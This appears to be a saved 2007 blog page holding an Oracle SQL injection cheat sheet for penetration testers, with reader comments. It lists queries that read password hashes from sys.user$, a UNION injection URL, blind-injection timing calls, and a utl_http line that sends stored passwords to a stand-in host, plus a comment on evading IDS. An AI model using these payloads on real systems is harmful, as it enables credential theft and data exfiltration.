@@ -1,0 +1,460 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0064)http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/ -->
+<HTML xmlns="http://www.w3.org/1999/xhtml"><HEAD><TITLE>ORACLE SQL Injection Cheat Sheet</TITLE>
+<META http-equiv=content-type content="application/xhtml+xml; charset=utf-8">
+<META content="index, follow" name=robots>
+<META 
+content="Ferruh Mavituna' nın Güvenlik, İnternet Teknolojileri, Yazılım Geliştirme ve benzer konular üzerine yazdığı mekan" 
+name=description>
+<META content=cheat,sheet,english,paper,oracle,sql,injection, name=keywords>
+<META content="Ferruh Mavituna" name=author><LINK href="/favicon.ico" 
+rel="shortcut icon"><LINK media=screen 
+href="ORACLE SQL Injection Cheat Sheet_files/fm.css" type=text/css 
+rel=stylesheet><LINK href="ORACLE SQL Injection Cheat Sheet_files/style.css" 
+type=text/css rel=stylesheet><LINK 
+href="C:\Documents and Settings\Rony\Desktop\New\ORACLE SQL Injection Cheat Sheet_files\style(1).css" 
+type=text/css rel=stylesheet><LINK title="RSS Feed" href="/rss/" 
+type=application/rss+xml rel=alternate><LINK title="Yorumlar RSS Feed" 
+href="/rss/comments/" type=application/rss+xml rel=alternate>
+<SCRIPT src="ORACLE SQL Injection Cheat Sheet_files/jquery.js" 
+type=text/javascript></SCRIPT>
+
+<SCRIPT src="ORACLE SQL Injection Cheat Sheet_files/fmv3.js" 
+type=text/javascript></SCRIPT>
+
+<SCRIPT src="ORACLE SQL Injection Cheat Sheet_files/searchhighlight.js" 
+type=text/javascript></SCRIPT>
+
+<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
+<BODY>
+<DIV id=container>
+<DIV id=header><A href="http://ferruh.mavituna.com/"><IMG height=65 
+alt="Ferruh Mavituna Logo" src="ORACLE SQL Injection Cheat Sheet_files/fm.gif" 
+width=146></A> </DIV>
+<DIV id=wrapper>
+<DIV class=navtoggle><A class=jnavigation style="TEXT-DECORATION: none" 
+href="javascript:;"><IMG class=abs height=16 alt="" 
+src="ORACLE SQL Injection Cheat Sheet_files/hide.gif" width=17> Menüyü 
+Gizle</A></DIV>
+<DIV id=content>
+<DIV class=blog id=blogoracle-sql-injection-cheat-sheet>
+<H1><A 
+href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/">ORACLE 
+SQL Injection Cheat Sheet</A></H1>
+<DIV class=tags><IMG class=abs height=16 alt=Etiketler 
+src="ORACLE SQL Injection Cheat Sheet_files/tag_blue.png" width=16> <A class=tag 
+href="http://ferruh.mavituna.com/tag/sql+injection/">sql injection</A>, <A 
+class=tag href="http://ferruh.mavituna.com/tag/oracle/">oracle</A>, <A class=tag 
+href="http://ferruh.mavituna.com/tag/paper/">paper</A>, <A class=tag 
+href="http://ferruh.mavituna.com/tag/english/">english</A>, <A class=tag 
+href="http://ferruh.mavituna.com/tag/cheat+sheet/">cheat sheet</A>, <SPAN 
+class=date>02.10.2007</SPAN> </DIV>
+<DIV style="FLOAT: right">
+<SCRIPT type=text/javascript><!--
+google_ad_client = "pub-1207650579797604";
+/* 250x250, created 21/09/08 */
+google_ad_slot = "2274562468";
+google_ad_width = 250;
+google_ad_height = 250;
+//-->
+</SCRIPT>
+
+<SCRIPT src="ORACLE SQL Injection Cheat Sheet_files/show_ads.js" 
+type=text/javascript>
+</SCRIPT>
+</DIV>
+<DIV class=post>
+<UL>
+  <LI>
+  <DIV><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#introduction">Introduction</A></DIV>
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#notes">ORACLE 
+  SQL Injection Notes</A> 
+  <LI>
+  <DIV><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#concat">Concatenation</A></DIV>
+  <LI>
+  <DIV><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#comments">Comments</A></DIV>
+  <LI>
+  <DIV><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#casting">Casting</A></DIV>
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#strings">Strings 
+  without Quotes</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#gettingstuff">Getting 
+  Stuff</A> 
+  <UL>
+    <LI><A 
+    href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#gettingtables">Getting 
+    Tables</A> 
+    <LI>
+    <DIV><A 
+    href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#gettingcolumns">Getting 
+    Columns</A></DIV>
+    <LI><A 
+    href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#gettingcurrentdatabase">Getting 
+    Current Database Name</A> 
+    <LI><A 
+    href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#gettingusers">Getting 
+    Users and Passwords</A> 
+    <LI><A 
+    href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#gettingversion">Getting 
+    Version</A> 
+    <LI><A 
+    href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#gettingcurrentuser">Getting 
+    Current User</A></LI></UL>
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#union">Simple 
+  Union Query</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#SQLTOP">Simulating 
+  SQL Server's TOP feature</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#movingrecords">Moving 
+  Records one by one</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#blindsql">Functions 
+  useful for Blind SQL Injection</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#outbound">Doing 
+  outbound connections</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#references">References, 
+  Credits, Thanks &amp; Document History</A></LI></UL>
+<H2 id=introduction>Introduction</H2>
+<P>Quick and Dirty <STRONG>ORACLE SQL Injection Cheat Sheet</STRONG> which will 
+be&nbsp;combined with main <A 
+href="http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/">SQL Injection 
+Cheat Sheet</A> eventually. This cheat sheet can help you to get started for 
+basic ORACLE SQL Injections.</P>
+<H2 id=notes>ORACLE SQL Injection Notes</H2>
+<P>In ORACLE you can not just SELECT stuff you have to SELECT them from some 
+table. For this purpose you can use special table called DUAL. 
+<P>i.e. <I>SELECT 'dummydata' || 'x' FROM DUAL;</I> 
+<P>You have to close comments if you used <I>/* comment */</I> style comments 
+<H2 id=concat>Concatenation </H2>
+<P>SELECT utl_raw.concat('x','y') FROM DUAL; SELECT 'x' || 'y' FROM DUAL; SELECT 
+'a' || 'b' FROM DUAL; SELECT user || '-' || password FROM members; 
+<H2 id=comments>Comments </H2><PRE>/* comment */
+</PRE>
+<P>Note&nbsp;: You have to close this comments properly otherwise you'll get 
+syntax error. <BR><BR>Line comment&nbsp;: -- </P>
+<P><A></A>
+<H2 id=casting>Casting </H2>
+<P>For most of the data types concatenating data with a string can do the 
+casting automatically. SELECT 1 || 'a' FROM DUAL; </P>
+<H2 id=strings>Strings without quotes </H2>
+<P>SELECT chr(110) || chr(111) FROM DUAL; <BR>OR <BR>SELECT 
+utl_raw.cast_to_varchar2(TO_CHAR(110)) FROM DUAL; </P>
+<H2 id=gettingcurrentdatabase>Getting Stuff</H2>
+<H3 id=gettingtables>Getting Tables </H3>
+<P>SELECT table_name FROM all_tables WHERE TABLESPACE_NAME='USERS' 
+<P><A></A>
+<H3 id=gettingcolumns>Getting Columns </H3>
+<P>SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE-NAME' </P>
+<H3>Getting Current Database Name </H3>
+<P>SELECT global_name&nbsp;FROM global_name 
+<P><A></A>
+<H3 id=gettinguser>Getting Users and Passwords </H3>
+<P>SELECT name, password FROM sys.user$ where type#=1 
+<P><A></A>
+<H3 id=gettingversion>Getting version</H3>
+<P>Select banner || '-' || (select banner from v$version where banner like 
+'Oracle%') from v$version where banner like 'TNS%' 
+<P><A></A>
+<H3 id=gettingcurrentuser>Getting Current User </H3>
+<P>SELECT user&nbsp;FROM dual </P>
+<H2 id=union>Simple Union Query</H2>
+<P><A 
+href="http://127.0.0.1/sqlinjection/ora.php?id=-101%20UNION%20ALL%20SELECT%20(SELECT%20user%20FROM%20dual)%20FROM%20DUAL">http://127.0.0.1/sqlinjection/ora.php?id=-101%20UNION%20ALL%20SELECT%20(SELECT%20user%20FROM%20dual)%20FROM%20DUAL</A> 
+</P>
+<H2 id=SQLTOP>Simulating SQL Server's TOP feature </H2>
+<P>SELECT FIRST_NAME FROM (SELECT ROWNUM R, FIRST_NAME FROM hr.employees) WHERE 
+R &lt;= 3; </P>
+<H2>Moving Records one by one </H2>
+<P>SELECT FIRST_NAME FROM (SELECT ROWNUM R, FIRST_NAME FROM hr.employees) WHERE 
+R = 3; 
+<P><A></A>
+<H2 id=blindsql>Functions useful for Blind SQL Injetion </H2>
+<UL>
+  <LI><B>BEGIN DBMS_LOCK.SLEEP(5); END;</B> - Sleep for 5 seconds 
+  <LI><B>CHR()</B> - Convert to Char 
+  <LI><B>ASCII()</B> - Convert to ASCII 
+  <LI><B>SUBSTR()</B> - Substring 
+  <LI><B>BITAND()</B> - Bit And operation 
+  <LI><B>LOWER()</B> - Convert to LowerCase </LI></UL>
+<P><A></A>
+<H2 id=outbound>Doing outbound&nbsp;connections&nbsp;</H2>
+<UL>
+  <LI>SELECT utl_http.request('http://www.example.com') FROM DUAL SELECT 
+  utl_http.request('http://www.example.com/?' || (SELECT pass FROM members) ) 
+  FROM DUAL 
+  <LI>SELECT HTTPURITYPE('http://www.example.com').getXML() FROM DUAL;</LI></UL>
+<P>You can test blind SQL Injection from DNS requests (<EM>can be more reliable 
+against egress filtering</EM>) or from actual web request. 
+<P><A></A>
+<P><A></A>
+<H2 id=references>References, Papers &amp; Credits</H2>
+<UL>
+  <LI>Thanks to <A href="http://pentestmonkey.net/">Pentestmonkey</A>, <A 
+  href="http://www.notsosecure.com/">Notsosecure</A>, Alexander Kornbrust 
+  <LI><A 
+  href="http://www.integrigy.com/security-resources/whitepapers/Integrigy_Oracle_SQL_Injection_Attacks.pdf">SQL 
+  Injection Attacks for ORACLE Developers</A> 
+  <LI><A 
+  href="http://www.red-database-security.com/whitepaper/oracle_security_whitepaper.html">Red 
+  Database Security Papers</A>&nbsp; 
+  <LI><A href="http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/">SQL 
+  Injection Cheat Sheet</A></LI></UL>
+<H2>Document History</H2>
+<UL>
+  <LI><CITE>02/10/2007 - Public Release</CITE> 
+  <LI>02/10/2007 - Getting passwords section and utl_http replaced with new and 
+  easier ones. Thanks to <CITE>Alexander Kornbrust</CITE> 
+  <LI>09/10/2007 - Sleep function added </LI></UL></DIV>
+<DIV class=commentlinks><A class=jwritecomment 
+id=/oracle-sql-injection-cheat-sheet-oku/ 
+href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/#addcomment"><IMG 
+class=abs height=16 alt="Yorum Ekle" 
+src="ORACLE SQL Injection Cheat Sheet_files/comment_add.png" width=16> Yorumunu 
+Ekle</A> - <A 
+href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/print/"><IMG 
+class=abs height=16 alt="Yazıcı Versiyonu" 
+src="ORACLE SQL Injection Cheat Sheet_files/printer.png" width=16> Yazıcı 
+Versiyonu</A> - <A 
+href="http://ferruh.mavituna.com/oracle-sql-injection-cheat-sheet-oku/rss/"><IMG 
+class=abs height=16 alt="Yorumlar için RSS" 
+src="ORACLE SQL Injection Cheat Sheet_files/commentrss.png" width=16> Yorumlar 
+için RSS</A> </DIV>
+<DIV class=tags>anahtar kelimeler : cheat sheet english paper oracle sql 
+injection </DIV>
+<DIV id=relatedarticles>
+<H3>İlişkili olabilecek yazılar</H3>
+<UL>
+  <LI><A 
+  href="http://ferruh.mavituna.com/o-reilly-den-yeni-cikacak-kitaplar-oku/">O'Reilly' 
+  den Yeni Çıkacak Kitaplar</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/orhan-pamuk-nobel-odulu-almis-oku/">Orhan 
+  Pamuk Nobel Ödülü Almış</A> 
+  <LI><A href="http://ferruh.mavituna.com/orijinal-demokrasi-oku/">Orijinal 
+  Demokrasi</A> </LI></UL></DIV></DIV><A id=comments></A>
+<DIV class=comment>
+<DIV class=commentd><IMG height=64 alt="" 
+src="ORACLE SQL Injection Cheat Sheet_files/2139349690.png" width=64> </DIV>
+<H4>rem7ter - <EM>22.11.2008</EM></H4>
+<P>thanks!but not sure that is useful</P></DIV>
+<DIV class=comment>
+<DIV class=commentd><IMG height=64 alt="" 
+src="ORACLE SQL Injection Cheat Sheet_files/-1734518239.png" width=64> </DIV>
+<H4><A href="http://www.deep-power.net/" rel=nofollow>Deep Power</A> - 
+<EM>16.10.2008</EM></H4>
+<P>Ferruh abi iyi güzel de ingilizce.Ingilizcem o kadar iyi degildir.En iyisi 
+sen bunu tr ye çevir.Bir lise ogrencisi için zor : )<BR>Selametle...</P></DIV>
+<DIV class=comment style="BORDER-LEFT-COLOR: #f30">
+<DIV class=commentd><IMG height=64 alt="" 
+src="ORACLE SQL Injection Cheat Sheet_files/1870308412.png" width=64> </DIV>
+<H4>Ferruh Mavituna - <EM>02.10.2007</EM></H4>
+<P>Alexandar,<BR>Thanks for your comments. I'm quite new in ORACLE stuff. I 
+updated current list according to your comments. </P></DIV>
+<DIV class=comment>
+<DIV class=commentd><IMG height=64 alt="" 
+src="ORACLE SQL Injection Cheat Sheet_files/770589094.png" width=64> </DIV>
+<H4>Alexander Kornbrust - <EM>02.10.2007</EM></H4>
+<P>Nice list but some of the statements are too complicated:<BR><BR>e.g. 
+<BR>SELECT username, FROM all_users UNION SELECT name, password FROM 
+sys.user$<BR>better: SELECT name, password FROM sys.user$ where 
+type#=1<BR><BR>or<BR>use httpuritype instead of utl_http. utl_http is often 
+removed from public. httpuritype works also and is not flagged by IDS:<BR>SELECT 
+HTTPURITYPE('http://www.red-database-security.com').getXML() FROM 
+DUAL;<BR><BR></P></DIV>
+<DIV style="TEXT-ALIGN: center"><SPAN class=pagingnormal></SPAN></DIV>
+<DIV id=commentarticlewrite>
+<SCRIPT src="ORACLE SQL Injection Cheat Sheet_files/jquery.markitup.pack.js" 
+type=text/javascript></SCRIPT>
+
+<SCRIPT src="ORACLE SQL Injection Cheat Sheet_files/set.js" 
+type=text/javascript></SCRIPT>
+
+<H1 id=addcomment>Yorum Yazın</H1>
+<BLOCKQUOTE><BR>Tüm yorumlar onaydan geçmektedir, bu işlem en uzun 30 dk. 
+  sürecektir. E-mail adresleri yeni yorumları bildirme harici hiç bir başka 
+  amaçla kullanılmamaktadır ve sitede gözükmemektedir. </BLOCKQUOTE>
+<FORM class=commentform id=addcommentform-oracle-sql-injection-cheat-sheet 
+action=/ajax/comments/save/default.aspx?redirect=true method=post>
+<DIV style="WIDTH: 100%"><LABEL class=required for=sender>İsim / Nick :</LABEL> 
+<INPUT id=sender tabIndex=1 name=sender><BR><LABEL accessKey=e for=email>Email 
+:</LABEL> <INPUT id=email title=email tabIndex=2 name=email> <INPUT 
+id=newcomments style="DISPLAY: none; WIDTH: auto" type=checkbox value=1 
+name=newcomments> <!-- Yeni yorumlardan haberdar et --><BR><LABEL 
+for=website>Web Sitesi :</LABEL> <INPUT id=website tabIndex=3 name=website><BR><TEXTAREA id=comment tabIndex=4 name=comment rows=10 cols=10></TEXTAREA> 
+<INPUT type=hidden value=oracle-sql-injection-cheat-sheet name=article> 
+<DIV><IMG class=captcha 
+style="BORDER-RIGHT: #999 1px solid; BORDER-TOP: #999 1px solid; FLOAT: right; BORDER-LEFT: #999 1px solid; MARGIN-RIGHT: 100px; BORDER-BOTTOM: #999 1px solid" 
+height=50 alt="Captcha Kodu" 
+src="ORACLE SQL Injection Cheat Sheet_files/captcha.gif" width=150> <LABEL 
+style="MARGIN-TOP: 15px; WIDTH: 200px" for=captcha>Sağdaki Resimdeki Numaralar 
+:</LABEL> <INPUT id=captcha style="MARGIN-TOP: 15px; WIDTH: 80px" tabIndex=5 
+maxLength=6 name=captcha> </DIV>
+<P style="CLEAR: both"><INPUT class=but tabIndex=6 type=submit value="Yorumu Ekle"></P></DIV></FORM>
+<SCRIPT type=text/javascript>
+    $("textarea").markItUp(mySettings);
+    if(self.SendingForm)
+        $("#addcommentform-oracle-sql-injection-cheat-sheet").ajaxForm({beforeSubmit: SendingForm, success: GetResponse});
+</SCRIPT>
+</DIV><!-- Content Wrapper --></DIV></DIV>
+<DIV id=navigation>
+<DIV class=section>
+<DIV style="TEXT-ALIGN: center"></DIV>
+<H2><SPAN id=ferruh>ferruh.mavituna</SPAN></H2>
+<DIV class=about>
+<P>Site genel olarak güvenlik, internet ve web teknolojileri üzerine yazdığım 
+yazılardan oluşmaktadır. Sitede <STRONG>2003 yılından</STRONG> bu yana yazılmış 
+<STRONG>1750' den fazla yazı</STRONG> bulunmaktadır.</P>
+<P>Bunun yanında <A 
+href="http://ferruh.mavituna.com/projects-browse/">projeler</A> de geliştirdiğim 
+projeleri, <A href="http://ferruh.mavituna.com/white-papers-browse/">ar-ge</A> 
+kısmında güvenlik araştırma dokümanlarıma ulaşabilir, <A 
+href="http://ferruh.mavituna.com/applications-browse/">programlar</A> kısmından 
+yazdığım yazılımları download edebilirsiniz. <A 
+href="http://ferruh.mavituna.com/hakkinda-oku/">Site hakkında.</A> </P></DIV>
+<DIV class=aboute>
+<P>List of <A href="http://ferruh.mavituna.com/tag/english/">english 
+articles</A>, <A 
+href="http://ferruh.mavituna.com/search/?s=1&amp;AnyTag=&amp;Tags=english&amp;q=&amp;SearchTitle=&amp;SearchArticle=&amp;SearchTitle=&amp;ExactMatch=&amp;Asc=&amp;Order=&amp;StartDate=&amp;EndDate=&amp;Featured=&amp;OrderByTalk=&amp;OrderByPopulatity=&amp;RSS=1">RSS</A> 
+or <A href="http://ferruh.mavituna.com/english-browse/">try this 
+page</A>.</P></DIV></DIV>
+<DIV class=section>
+<H2><SPAN>ARAMA</SPAN></H2>
+<FORM id=asearch name=asearch action=/search/ method=get><INPUT id=q 
+style="WIDTH: 200px" name=q> <INPUT class=but style="WIDTH: 50px" type=submit value=Ara><BR><INPUT 
+type=hidden value=1 name=SearchArticle> <INPUT type=hidden value=1 
+name=SearchTitle> <A href="http://ferruh.mavituna.com/advancedsearch/">Detaylı 
+Arama</A> </FORM></DIV>
+<DIV class=section>
+<H2><SPAN>TAKİP</SPAN></H2>
+<DIV style="TEXT-ALIGN: center"><A href="http://ferruh.mavituna.com/rss/"><IMG 
+height=28 alt="Siteyi RSS ile Takip Et" 
+src="ORACLE SQL Injection Cheat Sheet_files/rss.png" width=28></A> <A 
+href="http://www.feedburner.com/fb/a/emailverifySubmit?feedId=333622&amp;loc=en_US"><IMG 
+height=28 alt="Siteyi E-mail ile Takip Et" 
+src="ORACLE SQL Injection Cheat Sheet_files/mail.png" width=28></A> <A 
+href="http://feeds.feedburner.com/fmavituna"><IMG 
+style="BORDER-TOP-WIDTH: 0px; BORDER-LEFT-WIDTH: 0px; BORDER-BOTTOM-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px" 
+height=26 alt="RSS Takipçileri" 
+src="ORACLE SQL Injection Cheat Sheet_files/fmavituna.gif" width=88></A> <BR><A 
+href="http://whos.amung.us/show/s6h5ipp4"><IMG height=29 alt="website stats" 
+src="ORACLE SQL Injection Cheat Sheet_files/wau-widget.png" width=81></A> <A 
+href="http://twitter.com/fmavituna"><IMG height=28 alt="Follow me on Twitter" 
+src="ORACLE SQL Injection Cheat Sheet_files/twitter.png" width=28></A> <A 
+href="http://friendfeed.com/fmavituna"><IMG height=28 
+alt="Follow me on FriendFeed" 
+src="ORACLE SQL Injection Cheat Sheet_files/friendfeed.png" width=28></A> 
+</DIV></DIV>
+<DIV class=section>
+<H2><SPAN>YORUMLAR</SPAN></H2>
+<DIV id=livecomments></DIV></DIV>
+<DIV class=section>
+<H2><SPAN>KATEGORİLER</SPAN></H2>
+<UL>
+  <LI><A href="http://ferruh.mavituna.com/cat-projects-browse/">Projeler - 
+  Programlar</A> 
+  <LI>
+  <UL>
+    <LI><A 
+    href="http://ferruh.mavituna.com/bsql-hacker-and-deep-blind-sql-injections-oku/">BSQL 
+    Hacker</A> <!-- <li><a href="/eski-projeler-oku/">Eski Programlar ve Projeler</a></li> --></LI></UL>
+  <LI><A href="http://ferruh.mavituna.com/cat-featured-browse/">En İyi 
+  Yazılar</A> 
+  <LI><A href="http://ferruh.mavituna.com/cat-security-browse/">Güvenlik</A> 
+  <LI><A href="http://ferruh.mavituna.com/cat-development-browse/">Yazılım 
+  Geliştirme</A> 
+  <LI><A href="http://ferruh.mavituna.com/cat-book-browse/">Kitap</A> 
+  <LI><A href="http://ferruh.mavituna.com/cat-personal-browse/">Kişisel / 
+  Hayat</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/cat-personal-development-browse/">Kişisel 
+  Gelişim</A> 
+  <LI><A 
+  href="http://ferruh.mavituna.com/cat-personal-development-browse/">Online 
+  Araçlar ve Projeler</A> 
+  <LI>
+  <UL>
+    <LI><A href="http://ferruh.mavituna.com/tools/converter/">Encoder / 
+    Converter</A> </LI></UL>
+  <LI><A href="http://ferruh.mavituna.com/sql+injection-browse/">SQL 
+  Injection</A> 
+  <LI>
+  <UL>
+    <LI><A 
+    href="http://ferruh.mavituna.com/makale/sql-injection-derslerine-giris/">SQL 
+    Injection Dersleri</A> 
+    <LI><A 
+    href="http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/">SQL 
+    Injection Cheat Sheet</A> 
+    <LI><A 
+    href="http://ferruh.mavituna.com/makale/oracle-sql-injection-cheat-sheet/">ORACLE 
+    SQL Injection Cheat Sheet</A> 
+    <LI><A 
+    href="http://ferruh.mavituna.com/makale/record-locater-for-sql-injection/">Record 
+    Locator</A><BR>
+    <LI><A 
+    href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Error 
+    Based SQL Injections</A> </LI></UL>
+  <LI><A href="http://ferruh.mavituna.com/tags/"><STRONG>Tüm 
+  Kategoriler</STRONG></A> </LI></UL><!-- <div class="anasayfa"><a href="/mainpageturkish-browse/">Teknik Yaz&#305;lar</a> <a href="/all-browse/">T&#252;m Yaz&#305;lar</a></div>--></DIV>
+<DIV class=section>
+<H2><SPAN>ARŞİV</SPAN></H2>
+<H3>Senelere Göre Arşivler</H3>
+<UL>
+  <LI><A href="http://ferruh.mavituna.com/archive/year/2008/">2009</A> (dur daha 
+  yeni başladı!) 
+  <LI><A href="http://ferruh.mavituna.com/archive/year/2008/">2008</A> (147 
+  yazı) 
+  <LI><A href="http://ferruh.mavituna.com/archive/year/2007/">2007</A> (358 
+  yazı) 
+  <LI><A href="http://ferruh.mavituna.com/archive/year/2006/">2006</A> (299 
+  yazı) 
+  <LI><A href="http://ferruh.mavituna.com/archive/year/2005/">2005</A> (356 
+  yazı) 
+  <LI><A href="http://ferruh.mavituna.com/archive/year/2004/">2004</A> (350 
+  yazı) 
+  <LI><A href="http://ferruh.mavituna.com/archive/year/2003/">2003</A> (245 
+  yazı) </LI></UL>
+<H3>Diğer Arşiv Erişimleri</H3>
+<UL>
+  <LI><A href="http://ferruh.mavituna.com/tags/">Etiket Arşivi</A> 
+  <LI><A href="http://ferruh.mavituna.com/archive/titles/">Son Yazılar</A> 
+  <LI><A href="http://ferruh.mavituna.com/archive/featured/">En iyi Yazılar</A> 
+  <LI><A href="http://ferruh.mavituna.com/archive/popular/">En Popüler 
+  Yazılar</A> 
+  <LI><A href="http://ferruh.mavituna.com/archive/looser/">En Tırt Yazılar</A> 
+  <LI><A href="http://ferruh.mavituna.com/archive/sensational/">Çok konuşulan 
+  Yazılar</A> 
+  <LI><A href="http://ferruh.mavituna.com/archive/whocares/">Kimsenin Takmadığı 
+  Yazılar</A> </LI></UL></DIV></DIV><!-- navigation --><!--	<div id="paging">
+		<p>.</p>
+	</div>--></DIV><!-- Main Container -->
+<DIV id=footer>
+<DIV align=center>
+<DIV class=content>Ferruh Mavituna © 2002-2008<BR><!--ferruh.mavituna.com Ferruh Mavituna' n&#305;n 2002' den bu yana yazd&#305;&#287;&#305; ki&#351;isel blogudur. Bu sitedeki yaz&#305;lar sadece onun ki&#351;isel g&#246;r&#252;&#351;lerini yans&#305;tmaktad&#305;r. Sitedeki i&#231;erik kaynak g&#246;sterildi&#287;i takdirde ticari veya ticari olmayan ama&#231;lar i&#231;in heryerde istenildi&#287;i &#351;ekilde kullan&#305;labilir.-->
+<P>Sabit IP Adresi : <A href="http://81.22.99.133/">81.22.99.133</A>, <A 
+href="https://ferruh.mavituna.com/">SSL Erişimi</A>, <A 
+href="http://ferruh.mavituna.com/hakkinda-oku/">Hakkında</A>, <A 
+href="http://ferruh.mavituna.com/contact/">İletişim</A>, <A 
+href="http://ferruh.mavituna.com/newspaper/">Okuduklarım</A>, <A 
+href="http://www.feedburner.com/fb/a/emailverifySubmit?feedId=333622&amp;loc=en_US">Mail-List</A>, 
+<A href="http://ferruh.mavituna.com/rss/">RSS</A> </P></DIV></DIV></DIV>
+<SCRIPT type=text/javascript>
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</SCRIPT>
+
+<SCRIPT type=text/javascript>
+var pageTracker = _gat._getTracker("UA-105651-3");
+pageTracker._trackPageview(document.referrer);
+</SCRIPT>
+</BODY></HTML>
